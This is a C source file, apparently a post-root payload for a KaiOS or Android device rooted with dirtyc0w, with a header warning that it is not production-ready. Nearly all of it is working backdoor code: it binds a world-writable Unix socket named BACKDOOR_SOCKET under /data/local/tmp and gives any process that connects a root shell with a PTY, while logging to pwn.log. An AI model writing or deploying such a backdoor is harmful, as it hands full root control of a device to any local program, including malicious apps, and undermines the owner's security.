// DO NOT USE: NOT READY FOR PRODUCTION AND WILL SOFT LOCK YOUR INSTALLATION

/*
	if by any chance you did't read the message above, just do a move:
	mv /data/local/tmp/rsvc/ /data/loval/tmp/rsvc.1
	then repeat all of the root process... when you got root access again, using
	payload inside of dirtyc0w dir, not this,remove rsvc.1
*/

#define _GNU_SOURCE
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/select.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <termios.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>

#define BACKDOOR_SOCKET "/data/local/tmp/rsock"
#define LOG_FILE "/data/local/tmp/pwn.log"
#define BUFSIZE 8192

static void logmsg(const char *s)
{
	int fd = open(LOG_FILE, O_WRONLY | O_CREAT | O_APPEND, 0644);
	if (fd >= 0)
	{
		char buf[128];
		int n = snprintf(buf, sizeof(buf), "[pid %d] %s", (int)getpid(), s);
		if (n > 0) write(fd, buf, n);
		close(fd);
	}
}

static void relay(int a, int b)
{
	fd_set fds;
	char buf[BUFSIZE];
	int maxfd = (a > b ? a : b) + 1;
	for (;;)
	{
		FD_ZERO(&fds);
		FD_SET(a, &fds);
		FD_SET(b, &fds);
		if (select(maxfd, &fds, NULL, NULL, NULL) < 0)
		{
			if (errno == EINTR) continue;
			break;
		}
		if (FD_ISSET(a, &fds))
		{
			ssize_t r = read(a, buf, sizeof(buf));
			if (r <= 0) break;
			if (write(b, buf, r) != r) break;
		}
		if (FD_ISSET(b, &fds))
		{
			ssize_t r = read(b, buf, sizeof(buf));
			if (r <= 0) break;
			if (write(a, buf, r) != r) break;
		}
	}
}

static void setup_env(int has_pty)
{
	struct utsname uts;
	char host[64] = "kaios";
	if (uname(&uts) == 0)
	{
		strncpy(host, uts.nodename, sizeof(host) - 1);
		host[sizeof(host) - 1] = '\0';
	}
	setenv("USER", "root", 1);
	setenv("LOGNAME", "root", 1);
	setenv("HOME", "/data/local/tmp", 1);
	setenv("HOSTNAME", host, 1);
	setenv("TERM", has_pty ? "xterm-256color" : "dumb", 1);
	setenv("PATH",
		"/system/bin:/system/xbin:/data/local/tmp:/sbin:/vendor/bin:/system/sbin",
		1);
	setenv("SHELL", "/system/bin/sh", 1);
	setenv("PS1", has_pty ? "\\u@\\h:\\w# " : "root@kaios:# ", 1);
}

static int try_read_size(int fd, int *rows, int *cols)
{
	struct timeval tv = {0, 100000};
	socklen_t tvlen = sizeof(tv);
	setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, tvlen);

	unsigned char hdr[6];
	ssize_t total = 0;
	while (total < 6)
	{
		ssize_t n = recv(fd, hdr + total, 6 - total, MSG_PEEK);
		if (n <= 0) break;
		total += n;
		if (total >= 1 && hdr[0] != 0x7F) break;
		if (total >= 2 && hdr[1] != 'K') break;
	}
	tv.tv_sec = 0; tv.tv_usec = 0;
	setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, tvlen);

	if (total == 6 && hdr[0] == 0x7F && hdr[1] == 'K')
	{
		recv(fd, hdr, 6, 0);
		*rows = (hdr[2] << 8) | hdr[3];
		*cols = (hdr[4] << 8) | hdr[5];
		if (*rows < 1 || *rows > 200) *rows = 24;
		if (*cols < 1 || *cols > 500) *cols = 80;
		return 1;
	}
	*rows = 24;
	*cols = 80;
	return 0;
}

static void handle_client(int client_fd)
{
	int rows, cols;
	try_read_size(client_fd, &rows, &cols);

	int master_fd = open("/dev/ptmx", O_RDWR | O_NOCTTY);
	if (master_fd >= 0)
	{
		grantpt(master_fd);
		unlockpt(master_fd);
		char *slave_name = ptsname(master_fd);
		if (slave_name)
		{
			int slave_fd = open(slave_name, O_RDWR);
			if (slave_fd >= 0)
			{
				struct winsize ws;
				memset(&ws, 0, sizeof(ws));
				ws.ws_row = rows;
				ws.ws_col = cols;
				ioctl(master_fd, TIOCSWINSZ, &ws);

				pid_t pid = fork();
				if (pid == 0)
				{
					close(master_fd);
					close(client_fd);
					setsid();
					ioctl(slave_fd, TIOCSCTTY, 0);
					dup2(slave_fd, STDIN_FILENO);
					dup2(slave_fd, STDOUT_FILENO);
					dup2(slave_fd, STDERR_FILENO);
					if (slave_fd > STDERR_FILENO) close(slave_fd);
					setup_env(1);
					execl("/data/local/tmp/busybox", "ash", NULL);
					execl("/system/bin/sh", "sh", NULL);
					const char *m = "payload_v2: exec failed\n";
					write(STDERR_FILENO, m, strlen(m));
					_exit(127);
				}
				close(slave_fd);
				relay(client_fd, master_fd);
				close(master_fd);
				kill(pid, SIGHUP);
				waitpid(pid, NULL, 0);
				return;
			}
		}
		close(master_fd);
	}

	// Fallback: no PTY -> exec shell directly on the socket
	dup2(client_fd, STDIN_FILENO);
	dup2(client_fd, STDOUT_FILENO);
	dup2(client_fd, STDERR_FILENO);
	close(client_fd);
	setup_env(0);
	execl("/data/local/tmp/busybox", "ash", NULL);
	execl("/system/bin/sh", "sh", NULL);
	const char *m = "payload_v2: exec failed\n";
	write(STDERR_FILENO, m, strlen(m));
	_exit(127);
}

static void sigchld(int sig)
{
	(void)sig;
	while (waitpid(-1, NULL, WNOHANG) > 0) ;
}

int main(void)
{
	/*
	 * api-daemon supervises this process by PID. Double-forking
		makes the original PID exit immediately; api-daemon then
		considers the service stopped and tears down / refuses to
		re-spawn the grandchild. Run in the foreground.
	*/
	logmsg("payload_v2: starting\n");

	signal(SIGCHLD, sigchld);
	signal(SIGPIPE, SIG_IGN);

	unlink(BACKDOOR_SOCKET);

	int server_fd = socket(AF_UNIX, SOCK_STREAM, 0);
	if (server_fd < 0)
	{
		logmsg("payload_v2: socket() failed\n");
		return 1;
	}

	struct sockaddr_un addr;
	memset(&addr, 0, sizeof(addr));
	addr.sun_family = AF_UNIX;
	strncpy(addr.sun_path, BACKDOOR_SOCKET, sizeof(addr.sun_path) - 1);

	if (bind(server_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
	{
		logmsg("payload_v2: bind() failed\n");
		return 1;
	}
	chmod(BACKDOOR_SOCKET, 0666);

	if (listen(server_fd, 5) < 0)
	{
		logmsg("payload_v2: listen() failed\n");
		return 1;
	}

	logmsg("payload_v2: listening on rsock\n");

	for (;;)
	{
		int client_fd = accept(server_fd, NULL, NULL);
		if (client_fd < 0)
		{
			if (errno == EINTR) continue;
			continue;
		}
		pid_t child = fork();
		if (child == 0)
		{
			close(server_fd);
			handle_client(client_fd);
			_exit(0);
		}
		close(client_fd);
	}
	return 0;
}